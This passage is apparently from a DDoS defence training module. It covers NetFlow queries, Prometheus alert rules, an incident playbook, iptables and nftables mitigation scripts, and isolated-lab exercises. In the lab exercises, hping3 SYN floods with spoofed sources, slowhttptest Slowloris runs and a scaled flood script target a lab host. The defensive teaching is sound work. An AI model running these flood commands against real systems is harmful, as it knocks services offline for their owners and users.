  -o extended \
  "dst ip 203.0.113.10"

# Protocol distribution (identify attack type)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s proto/bytes \
  "dst ip 203.0.113.10"

# Top source ports (identify amplification — port 53=DNS, 123=NTP, 11211=memcached)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s srcport/bytes \
  -n 10 \
  "dst ip 203.0.113.10 and proto udp"

# SYN-only traffic (SYN flood detection)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s srcip/packets \
  -n 20 \
  "dst ip 203.0.113.10 and flags S and not flags A"

# Traffic by source ASN (identify botnet origin)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s srcas/bytes \
  -n 20 \
  "dst ip 203.0.113.10"

# Identify carpet bombing (traffic distributed across subnet)
nfdump -r /var/cache/nfcapd/nfcapd.current \
  -s dstip/bytes \
  -n 256 \
  "dst net 203.0.113.0/24" \
  -o "fmt:%da %byt %pkt %fl"
```

### 8.4 Real-Time Dashboards

**Grafana dashboard configuration (Prometheus data source):**

```json
{
  "dashboard": {
    "title": "DDoS Monitoring Dashboard",
    "panels": [
      {
        "title": "Inbound Bandwidth (bps)",
        "type": "timeseries",
        "targets": [
          {
            "expr": "rate(node_network_receive_bytes_total{device='eth0'}[1m]) * 8",
            "legendFormat": "{{instance}}"
          }
        ],
        "fieldConfig": {
          "defaults": {
            "thresholds": {
              "steps": [
                {"value": 0, "color": "green"},
                {"value": 5000000000, "color": "yellow"},
                {"value": 8000000000, "color": "red"}
              ]
            }
          }
        }
      },
      {
        "title": "Packets Per Second",
        "type": "timeseries",
        "targets": [
          {
            "expr": "rate(node_network_receive_packets_total{device='eth0'}[1m])",
            "legendFormat": "RX PPS"
          }
        ]
      },
      {
        "title": "TCP SYN Rate",
        "type": "timeseries",
        "targets": [
          {
            "expr": "rate(node_netstat_Tcp_PassiveOpens[1m])",
            "legendFormat": "SYN/s (passive opens)"
          }
        ]
      },
      {
        "title": "Connection Tracking Usage",
        "type": "gauge",
        "targets": [
          {
            "expr": "node_nf_conntrack_entries / node_nf_conntrack_entries_limit * 100",
            "legendFormat": "Conntrack Usage %"
          }
        ]
      },
      {
        "title": "HTTP Request Rate",
        "type": "timeseries",
        "targets": [
          {
            "expr": "sum(rate(nginx_http_requests_total[1m]))",
            "legendFormat": "Total RPS"
          },
          {
            "expr": "sum(rate(nginx_http_requests_total{status=~'4..'}[1m]))",
            "legendFormat": "4xx RPS"
          },
          {
            "expr": "sum(rate(nginx_http_requests_total{status='429'}[1m]))",
            "legendFormat": "Rate Limited (429)"
          }
        ]
      }
    ]
  }
}
```

### 8.5 Automated Alerting

**Prometheus alerting rules for DDoS detection:**

```yaml
# /etc/prometheus/rules/ddos_alerts.yml
groups:
  - name: ddos_detection
    rules:
      - alert: HighBandwidthAnomaly
        expr: |
          rate(node_network_receive_bytes_total{device="eth0"}[5m]) * 8
          > 5 * avg_over_time(rate(node_network_receive_bytes_total{device="eth0"}[5m])[7d:1h])
        for: 2m
        labels:
          severity: critical
          team: security
        annotations:
          summary: "Possible volumetric DDoS — bandwidth 5x above weekly baseline"
          description: |
            Interface {{ $labels.device }} on {{ $labels.instance }}
            receiving {{ $value | humanize }}bps (baseline: {{ printf "avg_over_time(rate(node_network_receive_bytes_total{device='%s',instance='%s'}[5m])[7d:1h])" $labels.device $labels.instance | query | first | value | humanize }}bps)

      - alert: SYNFloodDetected
        expr: |
          rate(node_netstat_Tcp_PassiveOpens[1m]) > 10000
          and rate(node_netstat_Tcp_CurrEstab[1m]) < 100
        for: 1m
        labels:
          severity: critical
          team: security
        annotations:
          summary: "SYN flood detected — high SYN rate with low established connections"

      - alert: ConntrackNearExhaustion
        expr: node_nf_conntrack_entries / node_nf_conntrack_entries_limit > 0.8
        for: 1m
        labels:
          severity: critical
          team: network
        annotations:
          summary: "Connection tracking table at {{ $value | humanizePercentage }} capacity"

      - alert: HTTPFloodDetected
        expr: |
          sum(rate(nginx_http_requests_total[1m])) > 5 *
          avg_over_time(sum(rate(nginx_http_requests_total[1m]))[7d:1h])
        for: 3m
        labels:
          severity: high
          team: security
        annotations:
          summary: "Possible HTTP flood — request rate 5x above weekly baseline"

      - alert: DNSQueryFlood
        expr: rate(bind_incoming_queries_total[1m]) > 100000
        for: 2m
        labels:
          severity: critical
          team: security
        annotations:
          summary: "DNS query flood — {{ $value | humanize }} qps"

      - alert: HighRateLimitRejects
        expr: |
          sum(rate(nginx_http_requests_total{status="429"}[5m])) /
          sum(rate(nginx_http_requests_total[5m])) > 0.3
        for: 5m
        labels:
          severity: high
          team: security
        annotations:
          summary: "Over 30% of requests being rate-limited — possible L7 DDoS"
```

### 8.6 Attack Classification During Incident

**Decision tree for rapid attack classification:**

```
START: Anomaly detected
│
├─ Bandwidth spike > 5x baseline?
│  ├─ YES → Check protocol distribution
│  │  ├─ UDP dominant (>80%) → Check source ports
│  │  │  ├─ Port 53 dominant → DNS AMPLIFICATION
│  │  │  ├─ Port 123 dominant → NTP AMPLIFICATION
│  │  │  ├─ Port 11211 dominant → MEMCACHED REFLECTION
│  │  │  ├─ Port 389 dominant → CLDAP REFLECTION
│  │  │  └─ Random ports → UDP FLOOD
│  │  ├─ TCP dominant → Check flags
│  │  │  ├─ SYN only, no ACK → SYN FLOOD
│  │  │  ├─ ACK only → ACK FLOOD
│  │  │  └─ RST packets → TCP RESET ATTACK
│  │  └─ ICMP dominant → ICMP FLOOD
│  └─ NO → Check request metrics
│     ├─ HTTP RPS spike > 5x baseline?
│     │  ├─ YES → Check request patterns
│     │  │  ├─ Same URL, many sources → HTTP FLOOD
│     │  │  ├─ Unique URLs per request → CACHE BUSTING
│     │  │  ├─ Slow connections, low bandwidth → SLOWLORIS/RUDY
│     │  │  └─ API endpoints targeted → API ABUSE
│     │  └─ NO → Check connection metrics
│     │     ├─ High half-open connections → SYN FLOOD (below bandwidth)
│     │     ├─ Connection table near full → CONNECTION EXHAUSTION
│     │     └─ DNS QPS spike → DNS FLOOD
│     └─ Traffic distributed across subnet? → CARPET BOMBING
```

---

## 9. Incident Response per DDoS

### 9.1 DDoS Response Playbook

#### Phase 1: Initial Detection (0-5 minutes)

```
TRIGGER: Automated alert or manual report of service degradation

ACTIONS:
1. Verify alert is genuine (not monitoring false positive)
   - Check multiple monitoring sources
   - Verify from external probes (different network)
   - Confirm customer impact

2. Activate incident channel
   - Create incident Slack/Teams channel
   - Page on-call network engineer
   - Page on-call security engineer

3. Initial triage
   - Identify affected services/IPs
   - Determine current attack volume (bps, pps, RPS)
   - Classify attack vector (see decision tree above)
```

#### Phase 2: Classification (5-10 minutes)

```
ACTIONS:
1. Analyze traffic characteristics
   - NetFlow/sFlow top-N analysis
   - Protocol distribution
   - Source IP/ASN distribution
   - Geographic distribution

2. Determine attack type and magnitude
   - Volumetric? (check bandwidth utilization)
   - Protocol? (check connection tables, SYN rates)
   - Application? (check HTTP metrics, response times)
   - Multi-vector? (check for simultaneous indicators)

3. Assess business impact
   - Which services affected?
   - Customer-facing impact?
   - Revenue impact estimate?
   - Regulatory/SLA implications?
```

#### Phase 3: Mitigation Activation (10-30 minutes)

```
ACTIONS (ordered by escalation):

Level 1 — Local mitigation:
  □ Activate DDoS profiles on on-premise appliance
  □ Apply rate limiting ACLs
  □ Enable aggressive SYN cookies
  □ Null-route specific attack sources (if identifiable)

Level 2 — ISP engagement:
  □ Contact ISP NOC for upstream filtering
  □ Request community-based blackhole for specific sources
  □ Request ISP clean-pipe activation (if contracted)

Level 3 — Cloud scrubbing activation:
  □ Activate BGP diversion to scrubbing service
  □ Verify traffic is flowing through scrubbing center
  □ Confirm clean traffic is being delivered to origin
  □ Monitor for attack vectors bypassing scrubbing

Level 4 — Nuclear options (business decision):
  □ RTBH specific target IP (sacrifices that service to save others)
  □ Geographic blocking (drop all traffic from non-business regions)
  □ Emergency CDN failover to static page
```

#### Phase 4: Ongoing Monitoring (During Attack)

```
CONTINUOUS MONITORING:
- Attack volume trend (increasing? decreasing? shifting?)
- Mitigation effectiveness (clean traffic arriving at origin?)
- Service health (application responding? latency acceptable?)
- Collateral impact (other services affected?)
- Attack vector changes (attacker adapting?)

EVERY 15 MINUTES:
- Status update to stakeholders
- Reassess mitigation effectiveness
- Check for attack vector shifts
- Verify no new services impacted
```

#### Phase 5: De-escalation (Attack Subsiding)

```
CRITERIA FOR DE-ESCALATION:
- Attack volume below mitigation threshold for >15 minutes
- All services operating normally
- No indication of attack resumption

ACTIONS:
1. Maintain mitigation for minimum 2 hours after attack stops
2. Gradually reduce mitigation aggressiveness
3. Monitor for attack resumption
4. If stable for 4+ hours, consider returning to normal operation
5. Keep scrubbing on standby for 24 hours minimum
```

#### Phase 6: Post-Mortem (Within 48 hours)

```
POST-MORTEM DOCUMENT:
1. Timeline of events (UTC timestamps)
2. Attack characteristics (vectors, volume, duration, source analysis)
3. Detection effectiveness (how quickly detected? any gaps?)
4. Mitigation effectiveness (what worked? what didn't?)
5. Business impact (downtime, affected customers, revenue loss)
6. Root cause analysis (why were we vulnerable? what failed?)
7. Action items (improvements to prevention, detection, response)
8. Cost analysis (mitigation cost, business impact cost)

LESSONS LEARNED:
- Were detection thresholds appropriate?
- Was escalation path clear and fast enough?
- Did communication work effectively?
- Are there infrastructure improvements needed?
- Does the DDoS response plan need updating?
```

### 9.2 Communication During DDoS

**Status page template:**

```markdown
## Incident: Service Degradation — DDoS Attack
Status: Identified | Monitoring | Resolved
Updated: [TIMESTAMP UTC]

### Current Status
We are experiencing a distributed denial of service attack affecting [SERVICES].
Our mitigation systems are actively filtering attack traffic.

### Impact
- [SERVICE A]: Intermittent connectivity for some users
- [SERVICE B]: Elevated response times
- [SERVICE C]: Fully operational (not affected)

### Timeline
- [TIME] UTC: Increased error rates detected
- [TIME] UTC: Attack classified as [TYPE]
- [TIME] UTC: Mitigation activated
- [TIME] UTC: Service partially restored

### Next Update
We will provide an update within 30 minutes or sooner if status changes.
```

**ISP coordination email template:**

```
Subject: URGENT — DDoS Attack in Progress — Request for Upstream Mitigation

To: noc@isp-provider.com
From: noc@our-company.com
Priority: URGENT

We are currently experiencing a DDoS attack:
- Target: [IP/PREFIX]
- Observed volume: [X] Gbps / [Y] Mpps
- Attack type: [CLASSIFICATION]
- Duration: Started [TIME] UTC
- Our circuit ID: [CIRCUIT_ID]

Requesting:
1. Upstream ACL/rate-limiting for [SPECIFIC TRAFFIC PATTERN]
2. [If applicable] Activation of clean-pipe service per contract [CONTRACT_REF]
3. [If applicable] RTBH for source prefix [SOURCE_PREFIX] via community [COMMUNITY]

NOC contact: [NAME] at [PHONE] / [EMAIL]
Incident reference: [INC-NUMBER]
```

### 9.3 Manual Mitigation Techniques

**Emergency iptables rules during active attack:**

```bash
#!/bin/bash
# emergency_ddos_mitigate.sh — Apply emergency DDoS mitigation rules
# Usage: ./emergency_ddos_mitigate.sh <attack_type> [options]

set -euo pipefail

ATTACK_TYPE="${1:-}"
LOG_PREFIX="[DDOS-MITIGATE]"

log() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $LOG_PREFIX $*"; }

case "$ATTACK_TYPE" in
    syn_flood)
        log "Activating SYN flood mitigation"
        # Aggressive SYN cookies
        sysctl -w net.ipv4.tcp_syncookies=1
        sysctl -w net.ipv4.tcp_max_syn_backlog=65535
        sysctl -w net.ipv4.tcp_synack_retries=1

        # Rate limit SYN packets
        iptables -I INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT
        iptables -I INPUT -p tcp --syn -j DROP
        log "SYN flood mitigation active"
        ;;

    udp_flood)
        log "Activating UDP flood mitigation"
        TARGET_IP="${2:?Target IP required}"

        # Drop UDP to target except DNS (if needed)
        iptables -I INPUT -d "$TARGET_IP" -p udp --dport ! 53 -j DROP

        # Rate limit remaining UDP
        iptables -I INPUT -p udp -m limit --limit 1000/s --limit-burst 2000 -j ACCEPT
        iptables -I INPUT -p udp -j DROP
        log "UDP flood mitigation active for $TARGET_IP"
        ;;

    http_flood)
        log "Activating HTTP flood mitigation"
        # Per-source connection limit
        iptables -I INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset

        # Rate limit new connections
        iptables -I INPUT -p tcp --dport 443 --syn -m hashlimit \
            --hashlimit-name http_conn \
            --hashlimit-above 30/sec \
            --hashlimit-burst 50 \
            --hashlimit-mode srcip \
            -j DROP
        log "HTTP flood mitigation active"
        ;;

    amplification)
        log "Activating amplification mitigation"
        # Block common amplification source ports
        for PORT in 19 53 123 161 389 1900 11211; do
            iptables -I INPUT -p udp --sport "$PORT" -m limit --limit 100/s -j ACCEPT
            iptables -I INPUT -p udp --sport "$PORT" -j DROP
        done
        log "Amplification mitigation active"
        ;;

    null_route)
        log "Null routing target IP"
        TARGET_IP="${2:?Target IP required}"
        ip route add blackhole "$TARGET_IP/32"
        log "Null route active for $TARGET_IP"
        ;;

    *)
        echo "Usage: $0 {syn_flood|udp_flood|http_flood|amplification|null_route} [target_ip]"
        exit 1
        ;;
esac

log "Mitigation applied. Monitor and adjust as needed."
```

### 9.4 Evidence Collection for Law Enforcement

```bash
#!/bin/bash
# ddos_evidence_capture.sh — Forensic evidence collection during DDoS
# Preserves chain of custody for potential law enforcement involvement

set -euo pipefail

EVIDENCE_DIR="/var/evidence/ddos/$(date -u +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

log() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $*" | tee -a "$EVIDENCE_DIR/collection.log"; }

log "Starting DDoS evidence collection"
log "Evidence directory: $EVIDENCE_DIR"

# System state
log "Capturing system state"
date -u > "$EVIDENCE_DIR/timestamp.txt"
uname -a >> "$EVIDENCE_DIR/system_info.txt"
ip addr show >> "$EVIDENCE_DIR/network_config.txt"
ss -tunap > "$EVIDENCE_DIR/connections.txt"
cat /proc/net/nf_conntrack > "$EVIDENCE_DIR/conntrack_table.txt" 2>/dev/null || true
netstat -s > "$EVIDENCE_DIR/protocol_stats.txt"

# Traffic capture (limited — 10 seconds, 100MB max)
log "Capturing traffic sample (10 seconds)"
timeout 10 tcpdump -i eth0 -c 100000 -w "$EVIDENCE_DIR/traffic_sample.pcap" \
    "not host $(hostname -I | awk '{print $1}')" 2>/dev/null || true

# NetFlow data
log "Exporting NetFlow data"
if command -v nfdump &>/dev/null; then
    nfdump -r /var/cache/nfcapd/nfcapd.current \
        -o extended > "$EVIDENCE_DIR/netflow_dump.txt" 2>/dev/null || true
fi

# Firewall logs
log "Capturing firewall logs"
dmesg | grep -i "drop\|reject\|ddos" > "$EVIDENCE_DIR/kernel_drops.txt" 2>/dev/null || true
journalctl -u iptables --since "1 hour ago" > "$EVIDENCE_DIR/firewall_logs.txt" 2>/dev/null || true

# Application logs
log "Capturing application access logs"
tail -10000 /var/log/nginx/access.log > "$EVIDENCE_DIR/nginx_access.txt" 2>/dev/null || true
tail -10000 /var/log/nginx/error.log > "$EVIDENCE_DIR/nginx_error.txt" 2>/dev/null || true

# Hash all evidence files for integrity
log "Computing integrity hashes"
find "$EVIDENCE_DIR" -type f ! -name "checksums.sha256" -exec sha256sum {} \; \
    > "$EVIDENCE_DIR/checksums.sha256"

log "Evidence collection complete"
log "Evidence directory: $EVIDENCE_DIR"
log "Verify integrity with: cd $EVIDENCE_DIR && sha256sum -c checksums.sha256"
```

---

## 10. Laboratorio Pratico

### 10.1 Lab Environment Setup

**IMPORTANT**: All exercises MUST be performed in an isolated lab environment. Never run DDoS tools against production systems or systems you do not own.

**Lab topology:**

```
┌─────────────────────────────────────────────────────┐
│                   ISOLATED LAB NETWORK               │
│                   (No internet access)               │
│                                                      │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐   │
│  │ Attacker │     │  Target  │     │ Monitor  │   │
│  │ (Kali)   │────→│ (Ubuntu) │←────│(Grafana) │   │
│  │ 10.0.0.10│     │ 10.0.0.20│     │10.0.0.30 │   │
│  └──────────┘     └──────────┘     └──────────┘   │
│       │                │                 │          │
│       └────────────────┴─────────────────┘          │
│                  10.0.0.0/24                         │
│              (isolated switch/bridge)                │
└─────────────────────────────────────────────────────┘
```

**Docker Compose for lab deployment:**

```yaml
# docker-compose.yml — DDoS lab environment
version: '3.8'

services:
  target:
    image: ubuntu:22.04
    container_name: ddos_target
    hostname: target
    networks:
      ddos_lab:
        ipv4_address: 10.0.0.20
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    command: >
      bash -c "
        apt-get update && apt-get install -y nginx iptables iproute2 procps net-tools nftables fail2ban &&
        nginx &&
        tail -f /var/log/nginx/access.log
      "
    ports: []  # No external exposure

  attacker:
    image: kalilinux/kali-rolling
    container_name: ddos_attacker
    hostname: attacker
    networks:
      ddos_lab:
        ipv4_address: 10.0.0.10
    cap_add:
      - NET_ADMIN
      - NET_RAW
    command: >
      bash -c "
        apt-get update && apt-get install -y hping3 python3-scapy slowhttptest nmap &&
        sleep infinity
      "

  monitor:
    image: grafana/grafana:latest
    container_name: ddos_monitor
    hostname: monitor
    networks:
      ddos_lab:
        ipv4_address: 10.0.0.30
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=lab_password_change_me
    volumes:
      - grafana_data:/var/lib/grafana

  prometheus:
    image: prom/prometheus:latest
    container_name: ddos_prometheus
    hostname: prometheus
    networks:
      ddos_lab:
        ipv4_address: 10.0.0.31
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml

networks:
  ddos_lab:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
          gateway: 10.0.0.1
    internal: true  # No internet access

volumes:
  grafana_data:
```

### 10.2 Exercise 1: SYN Flood Attack and Defense

**Step 1: Baseline measurement on target**

```bash
# On target (10.0.0.20) — check initial state
ss -s
cat /proc/sys/net/ipv4/tcp_max_syn_backlog
cat /proc/sys/net/ipv4/tcp_syncookies
cat /proc/net/netstat | grep -i syn

# Start nginx and verify it's working
curl -s -o /dev/null -w "%{http_code}" http://10.0.0.20/
# Expected: 200
```

**Step 2: Launch SYN flood from attacker**

```bash
# On attacker (10.0.0.10)
# WARNING: Isolated lab only!
hping3 -S -p 80 --flood --rand-source 10.0.0.20

# Alternative: controlled rate (1000 SYN/s)
hping3 -S -p 80 -i u1000 --rand-source 10.0.0.20
```

**Step 3: Observe impact on target (during attack)**

```bash
# On target — observe SYN_RECV buildup
watch -n 1 'ss -tn state syn-recv | wc -l'

# Check connection tracking
cat /proc/sys/net/netfilter/nf_conntrack_count

# Check if service is still responsive
while true; do
    curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
        --connect-timeout 5 http://10.0.0.20/
    sleep 1
done
```

**Step 4: Apply SYN flood defenses**

```bash
# On target — enable SYN cookies and tune parameters
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sysctl -w net.ipv4.tcp_synack_retries=2
sysctl -w net.core.somaxconn=65535

# Apply iptables rate limiting for SYN
iptables -A INPUT -p tcp --syn -m limit --limit 500/s --limit-burst 1000 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Verify service recovers
curl -s -o /dev/null -w "%{http_code}" http://10.0.0.20/
```

**Step 5: Verify defenses are effective**

```bash
# With attack still running, confirm:
# 1. SYN cookies are active
dmesg | grep -i "syn.*cookie"

# 2. Rate limiting is dropping excess SYN
iptables -nvL INPUT | grep -i "syn"

# 3. Service is still responsive
curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" http://10.0.0.20/
```

### 10.3 Exercise 2: Slowloris Attack and Defense

**Step 1: Launch Slowloris from attacker**

```bash
# On attacker — using slowhttptest
slowhttptest -c 1000 -H -g -o slowloris_result \
    -i 10 -r 200 -t GET -u http://10.0.0.20/ \
    -x 24 -p 3

# Parameters:
# -c 1000: 1000 connections
# -H: Slowloris mode (slow headers)
# -i 10: 10 second interval between follow-up data
# -r 200: 200 connections per second
# -t GET: GET method
# -x 24: max header length 24 bytes
# -p 3: 3 second probe connection timeout
```

**Step 2: Observe impact**

```bash
# On target — watch connection count climb
watch -n 1 'ss -tn state established | wc -l'

# Check nginx worker connections
curl -s http://10.0.0.20/nginx_status 2>/dev/null || echo "Service unreachable"
```

**Step 3: Apply Slowloris defenses**

```nginx
# /etc/nginx/nginx.conf — anti-Slowloris configuration

worker_processes auto;
worker_rlimit_nofile 65535;

events {
    worker_connections 10240;
    multi_accept on;
}

http {
    # Short timeouts kill slow connections
    client_header_timeout 5s;
    client_body_timeout 5s;
    send_timeout 5s;

    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=perip:10m;
    limit_conn perip 20;

    # Limit request rate
    limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;

    # Keep-alive limits
    keepalive_timeout 5s;
    keepalive_requests 50;

    server {
        listen 80;
        server_name _;

        limit_req zone=req burst=20 nodelay;

        location / {
            root /var/www/html;
            index index.html;
        }

        location /nginx_status {
            stub_status on;
            allow 10.0.0.0/24;
            deny all;
        }
    }
}
```

```bash
# Reload nginx with new config
nginx -t && nginx -s reload
```

**Step 4: Verify Slowloris is now ineffective**

```bash
# Repeat attack — observe connections being killed by timeout
slowhttptest -c 1000 -H -g -o slowloris_mitigated \
    -i 10 -r 200 -t GET -u http://10.0.0.20/ \
    -x 24 -p 3

# On target — connections should stay low due to timeout killing slow ones
watch -n 1 'ss -tn state established | wc -l'

# Service should remain responsive
curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" http://10.0.0.20/
```

### 10.4 Exercise 3: Deploy Comprehensive Defense Stack

**Full defense deployment on target:**

```bash
#!/bin/bash
# deploy_ddos_defenses.sh — Complete defense stack for lab target
set -euo pipefail

echo "[*] Deploying comprehensive DDoS defense stack"

# === Kernel Hardening ===
echo "[+] Applying kernel parameters"
cat > /etc/sysctl.d/99-ddos-lab.conf << 'EOF'
# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 65535
net.ipv4.tcp_synack_retries = 2
net.core.somaxconn = 65535

# Connection tracking
net.netfilter.nf_conntrack_max = 1000000
net.netfilter.nf_conntrack_tcp_timeout_syn_recv = 30
net.netfilter.nf_conntrack_tcp_timeout_time_wait = 30
net.netfilter.nf_conntrack_tcp_timeout_established = 300

# TCP hardening
net.ipv4.tcp_fin_timeout = 10
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_max_tw_buckets = 2000000
net.ipv4.tcp_timestamps = 1

# Anti-spoofing
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.accept_source_route = 0

# ICMP hardening
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ratelimit = 1000
EOF
sysctl --system

# === nftables Rules ===
echo "[+] Applying nftables rules"
cat > /etc/nftables.conf << 'EOF'
#!/usr/sbin/nft -f
flush ruleset

table inet ddos_defense {
    set blacklist {
        type ipv4_addr
        flags dynamic, timeout
        timeout 1h
    }

    chain input {
        type filter hook input priority filter; policy accept;

        # Drop blacklisted IPs
        ip saddr @blacklist counter drop

        # Drop invalid packets
        ct state invalid counter drop

        # Drop malformed TCP flags
        tcp flags & (fin|syn|rst|psh|ack|urg) == 0 counter drop
        tcp flags & (fin|syn) == fin|syn counter drop
        tcp flags & (syn|rst) == syn|rst counter drop

        # SYN rate limiting (500/s burst 1000)
        tcp flags syn limit rate 500/second burst 1000 packets accept
        tcp flags syn counter drop

        # ICMP rate limiting
        ip protocol icmp limit rate 10/second burst 20 packets accept
        ip protocol icmp counter drop

        # UDP rate limiting (per source)
        udp dport != 53 meter udp_limit { ip saddr limit rate over 100/second } counter drop

        # Connection limiting (per source, port 80/443)
        tcp dport { 80, 443 } meter conn_limit { ip saddr ct count over 50 } counter reject

        # Accept established connections
        ct state established,related accept
    }
}
EOF
nft -f /etc/nftables.conf

# === fail2ban ===
echo "[+] Configuring fail2ban"
cat > /etc/fail2ban/jail.d/ddos.conf << 'EOF'
[nginx-req-limit]
enabled = true
filter = nginx-req-limit
action = nftables-allports[name=req-limit]
logpath = /var/log/nginx/error.log
maxretry = 5
findtime = 60
bantime = 3600

[nginx-conn-limit]
enabled = true
filter = nginx-conn-limit
action = nftables-allports[name=conn-limit]
logpath = /var/log/nginx/error.log
maxretry = 3
findtime = 60
bantime = 3600
EOF

cat > /etc/fail2ban/filter.d/nginx-req-limit.conf << 'EOF'
[Definition]
failregex = limiting requests, excess:.* by zone.*client: <HOST>
ignoreregex =
EOF

cat > /etc/fail2ban/filter.d/nginx-conn-limit.conf << 'EOF'
[Definition]
failregex = limiting connections by zone.*client: <HOST>
ignoreregex =
EOF

systemctl restart fail2ban

# === Nginx Rate Limiting ===
echo "[+] Deploying nginx anti-DDoS config"
cat > /etc/nginx/conf.d/ddos_protection.conf << 'EOF'
# Rate limiting zones
limit_req_zone $binary_remote_addr zone=general:20m rate=30r/s;
limit_req_zone $binary_remote_addr zone=strict:10m rate=5r/s;

# Connection limiting
limit_conn_zone $binary_remote_addr zone=perip:20m;
EOF

echo "[*] Defense stack deployed successfully"
echo "[*] Test with: curl -s -o /dev/null -w '%{http_code}' http://10.0.0.20/"
```

### 10.5 Exercise 4: Monitoring with NetFlow and Grafana

**Prometheus node_exporter metrics for DDoS monitoring:**

```yaml
# prometheus.yml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'target'
    static_configs:
      - targets: ['10.0.0.20:9100']

  - job_name: 'nginx'
    static_configs:
      - targets: ['10.0.0.20:9113']
```

**Custom exporter for DDoS metrics:**

```python
#!/usr/bin/env python3
"""Custom Prometheus exporter for DDoS-relevant metrics."""

from prometheus_client import start_http_server, Gauge
from pathlib import Path
import subprocess
import time

# Define metrics
syn_recv_count = Gauge('ddos_tcp_syn_recv_total', 'TCP connections in SYN_RECV state')
established_count = Gauge('ddos_tcp_established_total', 'TCP established connections')
conntrack_count = Gauge('ddos_conntrack_entries', 'Connection tracking entries')
conntrack_max = Gauge('ddos_conntrack_max', 'Connection tracking table maximum')
iptables_drops = Gauge('ddos_iptables_drops_total', 'Packets dropped by iptables')
rx_pps = Gauge('ddos_rx_pps', 'Receive packets per second', ['interface'])

def collect_metrics() -> None:
    """Collect DDoS-related system metrics."""
    # TCP state counts
    result = subprocess.run(
        ['ss', '-tn', 'state', 'syn-recv'],
        capture_output=True, text=True
    )
    syn_recv_count.set(max(0, len(result.stdout.strip().split('\n')) - 1))

    result = subprocess.run(
        ['ss', '-tn', 'state', 'established'],
        capture_output=True, text=True
    )
    established_count.set(max(0, len(result.stdout.strip().split('\n')) - 1))

    # Connection tracking
    ct_count_path = Path('/proc/sys/net/netfilter/nf_conntrack_count')
    ct_max_path = Path('/proc/sys/net/netfilter/nf_conntrack_max')
    if ct_count_path.exists():
        conntrack_count.set(int(ct_count_path.read_text().strip()))
    if ct_max_path.exists():
        conntrack_max.set(int(ct_max_path.read_text().strip()))

if __name__ == '__main__':
    start_http_server(9200)
    print("DDoS metrics exporter running on :9200")
    while True:
        collect_metrics()
        time.sleep(5)
```

### 10.6 Exercise 5: Threshold Tuning

**Systematic threshold testing procedure:**

```bash
#!/bin/bash
# threshold_test.sh — Find optimal rate limiting thresholds
# Run from attacker against target with defenses deployed

TARGET="10.0.0.20"
RESULTS_DIR="/tmp/threshold_results"
mkdir -p "$RESULTS_DIR"

echo "=== DDoS Threshold Testing ==="
echo "Target: $TARGET"
echo "Results: $RESULTS_DIR"
echo ""

# Test increasing SYN rates
echo "--- SYN Flood Threshold Test ---"
for RATE in 100 500 1000 5000 10000 50000; do
    echo -n "Rate: ${RATE}/s ... "

    # Send SYN flood for 10 seconds at controlled rate
    timeout 10 hping3 -S -p 80 -i "u$((1000000 / RATE))" --rand-source "$TARGET" \
        >/dev/null 2>&1 &
    HPING_PID=$!

    sleep 5  # Let attack stabilize

    # Test service availability
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 3 "http://$TARGET/" 2>/dev/null || echo "000")
    RESPONSE_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
        --connect-timeout 3 "http://$TARGET/" 2>/dev/null || echo "timeout")

    kill $HPING_PID 2>/dev/null
    wait $HPING_PID 2>/dev/null

    echo "HTTP=$HTTP_CODE, Time=${RESPONSE_TIME}s"
    echo "${RATE},${HTTP_CODE},${RESPONSE_TIME}" >> "$RESULTS_DIR/syn_threshold.csv"

    sleep 5  # Recovery between tests
done

echo ""
echo "--- HTTP Flood Threshold Test ---"
for RPS in 10 50 100 500 1000 5000; do
    echo -n "Rate: ${RPS} RPS ... "

    # HTTP flood using wrk (if available) or ab
    timeout 10 ab -n $((RPS * 10)) -c "$RPS" -q "http://$TARGET/" \
        > "$RESULTS_DIR/ab_${RPS}rps.txt" 2>&1 || true

    # Check service health after
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        --connect-timeout 3 "http://$TARGET/" 2>/dev/null || echo "000")

    echo "Post-test HTTP=$HTTP_CODE"
    sleep 5
done

echo ""
echo "Results saved to $RESULTS_DIR/"
echo "Review and adjust rate limiting thresholds based on:"
echo "  - Lowest rate that causes service degradation WITHOUT defenses"
echo "  - Set threshold at 50% of that value for safety margin"
```

### 10.7 Exercise 6: Document Response Procedures

**DDoS response runbook template (to complete during lab exercises):**

```yaml
# ddos_response_runbook.yml — Complete after lab exercises

metadata:
  version: "1.0"
  last_updated: "2025-05-07"
  tested_date: "FILL_AFTER_LAB"
  owner: "Security Operations"

detection:
  tools:
    - prometheus_alerts: "/etc/prometheus/rules/ddos_alerts.yml"
    - grafana_dashboard: "DDoS Monitoring Dashboard"
    - netflow_analysis: "nfdump queries documented in section 8.3"

  thresholds:
    # Fill these after threshold testing (Exercise 5)
    syn_rate_alert: "FILL: SYN/s threshold"
